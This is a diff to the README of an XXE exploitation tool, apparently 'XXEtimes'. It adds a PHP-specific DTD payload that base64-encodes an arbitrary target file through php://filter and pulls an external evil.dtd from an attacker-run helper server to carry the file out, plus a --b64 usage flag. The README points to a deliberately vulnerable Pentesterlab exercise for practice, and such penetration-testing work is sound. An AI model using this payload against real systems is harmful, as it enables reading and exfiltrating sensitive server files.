@@ -28,6 +28,15 @@ The script requires a request file. Once you have found an XXE injection in Burp
 %dtd;]>
 ```
 
+If you know the parser is PHP, base64 encoding the file works best (with the builtin php://filter). Your DTD should look like this:
+```
+<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///{targetFilename}">
+<!ENTITY % dtd SYSTEM "http://{xxeHelperServerInterface}:{xxeHelperServerPort}/evil.dtd">
+%dtd;
+]>
+```
+
 The special params in "{}" are necessary for XXEtimes to work. There is an example request file in the repo. This works with the deliberately vulnerable [PlayXXE challenge](https://pentesterlab.com/exercises/play_xxe) from Pentesterlab if you want to test it.
 
 ## Usage
@@ -35,7 +44,7 @@ The special params in "{}" are necessary for XXEtimes to work. There is an examp
 ```
 $ python xxetimes.py -h
 usage: xxetimes.py [-h] -f REQUESTFILE [-p PORT] [-t TARGETHOST]
-                   [-l LISTENPORT] -i INTERFACE
+                   [-l LISTENPORT] -i INTERFACE [--b64]
 
 Local File Explorer Using XXE DTD Entity Expansion
 
@@ -52,6 +61,8 @@ optional arguments:
                         Port for local DTD helper server
   -i INTERFACE, --listenIP INTERFACE
                         Bind IP address for local DTD helper server
+  --b64                 Flag if data will be base64 encoded (e.g. using php's
+                        convert.base64 function for files)
 ```
 
 It will likely require customization and tweaking for each specific vulnerability, but as long as the locations `{targetFilename}`, `{xxeHelperServerInterface}` and `{xxeHelperServerPort}` are present it should work.
